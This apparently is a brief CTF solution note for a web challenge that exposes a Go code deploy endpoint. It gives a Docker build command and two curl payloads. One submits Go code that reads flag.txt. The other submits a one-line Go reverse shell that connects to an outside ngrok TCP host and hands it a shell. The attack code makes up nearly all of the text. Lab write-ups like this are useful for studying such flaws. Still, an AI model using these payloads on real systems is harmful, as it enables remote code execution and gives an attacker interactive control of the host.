# extreme-hacking-web-five

docker buildx build --platform linux/amd64 . -t go-remote-code --load


curl -X POST -d 'package main
  
import ( 
        "fmt"                 
        "os/exec"
)                
  
func main() {                             
        // Comando para executar o script shell
        cmd := exec.Command("cat", "flag.txt")   
    
        // Executa o comando e captura a saída
        output, err := cmd.CombinedOutput()
        if err != nil {
                fmt.Println("Erro ao executar o script:", err)
                return
        }

        // Imprime a saída do script
        fmt.Println(string(output))
}
' http://localhost:8080/deploy

curl -X POST \
  -d 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","0.tcp.sa.ngrok.io:13049");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' \
  http://localhost:8080/deploy